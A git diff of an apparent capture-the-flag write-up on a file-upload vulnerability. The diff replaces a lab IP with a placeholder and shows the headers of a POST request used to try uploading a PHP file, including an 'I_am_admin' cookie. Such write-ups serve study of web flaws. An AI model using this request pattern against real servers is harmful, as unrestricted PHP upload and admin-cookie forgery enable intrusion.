@@ -5,7 +5,7 @@ In many web servers, the vulnerability depends entirely on its purpose, allowing
 
 # Steps
 
-This vulnerability exist on `http://192.168.1.9/index.php?page=upload`  
+This vulnerability exist on `http://IP_ADDRESS/index.php?page=upload`  
 We try to upload php file  
 output:
 
@@ -18,16 +18,16 @@ Request:
 
 ```
 POST /index.php?page=upload HTTP/1.1
-Host: 192.168.1.9
+Host: IP_ADDRESS
 Content-Length: 429
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://192.168.1.9
+Origin: http://IP_ADDRESS
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiFDBox1rlqcnR6Qg
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Sec-GPC: 1
-Referer: http://192.168.1.9/index.php?page=upload
+Referer: http://IP_ADDRESS/index.php?page=upload
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
